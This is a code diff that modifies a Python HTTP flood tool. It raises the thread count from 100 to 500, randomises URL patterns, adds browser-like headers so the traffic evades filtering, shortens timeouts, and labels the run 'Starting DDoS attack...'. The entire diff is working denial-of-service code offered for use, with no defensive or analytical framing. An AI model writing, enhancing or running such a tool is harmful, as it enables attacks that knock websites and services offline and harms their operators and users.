@@ -4,6 +4,7 @@ import sys
 import threading
 import random
 import re
+import time
 from headers import get_user_agents, get_referers
 
 url=''
@@ -16,7 +17,7 @@ safe=0
 
 def inc_counter():
     global request_counter
-    request_counter+=9999
+    request_counter+=1
 
 def set_flag(val):
     global flag
@@ -51,14 +52,16 @@ def httpcall(url):
     global request_counter
     useragent_list()
     referer_list()
-    code=0
-    if url.count("?")>0:
-        param_joiner="&"
-    else:
-        param_joiner="?"
     
     try:
-        request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+        # Create multiple request patterns
+        patterns = [
+            url + '?' + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)),
+            url + '/' + buildblock(random.randint(3,10)),
+            url + '?' + buildblock(random.randint(3,10)) + '=' + str(random.randint(1,999999))
+        ]
+        
+        request = urllib.request.Request(random.choice(patterns))
         request.add_header('User-Agent', random.choice(headers_useragents))
         request.add_header('Cache-Control', 'no-cache')
         request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -66,38 +69,39 @@ def httpcall(url):
         request.add_header('Keep-Alive', str(random.randint(110,120)))
         request.add_header('Connection', 'keep-alive')
         request.add_header('Host', host)
+        request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
+        request.add_header('Accept-Language', 'en-US,en;q=0.5')
+        request.add_header('Accept-Encoding', 'gzip, deflate')
         
-        response = urllib.request.urlopen(request, timeout=5)
+        response = urllib.request.urlopen(request, timeout=3)
         inc_counter()
         return response.getcode()
     except urllib.error.HTTPError as e:
-        code = e.code
         inc_counter()
     except urllib.error.URLError as e:
-        code = e.code
+        pass
     except Exception as e:
         pass
-    return code
+    return 0
 
 class HTTPThread(threading.Thread):
     def run(self):
         try:
             while flag<2:
-                code=0
-                if code == 0:
-                    httpcall(url)
-                else:
-                    break
+                httpcall(url)
         except:
             pass
 
 class MonitorThread(threading.Thread):
     def run(self):
         try:
+            last_counter = 0
             while flag==0:
-                if (request_counter/1000) > request_counter/1000.00 and request_counter/1000.00 > request_counter/1000:
-                    print(request_counter/1000.00, 'req/sec')
-                pass
+                time.sleep(1)
+                current_counter = request_counter
+                req_per_sec = current_counter - last_counter
+                last_counter = current_counter
+                print(f'[+] Requests: {current_counter} | Rate: {req_per_sec} req/sec')
         except:
             pass
 
@@ -115,18 +119,23 @@ if __name__ == '__main__':
         
         print('[+] Target:', url)
         print('[+] Host:', host)
-        print('[+] Starting...')
+        print('[+] Starting DDoS attack...')
         print('[+] Press Ctrl+C to stop')
         
         # Initialize headers
         useragent_list()
         referer_list()
         
-        for i in range(100):
+        # Increase number of threads for more aggressive attack
+        for i in range(500):
             t = HTTPThread()
+            t.daemon = True
             t.start()
+            
         t = MonitorThread()
+        t.daemon = True
         t.start()
+        
         while flag==0:
             try:
                 input()
@@ -134,5 +143,5 @@ if __name__ == '__main__':
                 break
     except KeyboardInterrupt:
         set_flag(2)
-        print('\n[+] Stopped')
+        print('\n[+] Attack stopped')
         sys.exit() 
